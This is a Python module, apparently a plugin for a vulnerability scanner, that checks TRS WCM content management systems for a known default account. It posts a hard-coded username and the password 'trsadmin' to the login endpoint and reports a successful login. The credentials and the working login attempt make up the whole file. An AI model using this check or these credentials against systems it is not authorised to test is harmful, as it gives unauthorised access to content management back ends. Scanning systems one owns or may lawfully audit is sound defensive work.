#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TRS wcm系统默认账户漏洞
referer: unknown
author: Ascotbe
reference: Lucifer
description: TRS wcm系统中存在"依申请公开"这个默认用户,默认密码是trsadmin,可直接登录。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


payload = "/wcm/app/login_dowith.jsp"

post_data = {
    "UserName": "依申请公开",
    "PassWord": "trsadmin"
}
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": scheme+"://"+url + "/wcm/app/login.jsp",
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.post(payload_url, data=post_data,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('main.jsp')!=-1 and con.lower().find('wcm imports begin')!=-1:
            Medusa = "{} 存在TRS wcm系统默认账户漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            return (Medusa)
    except Exception as e:
        pass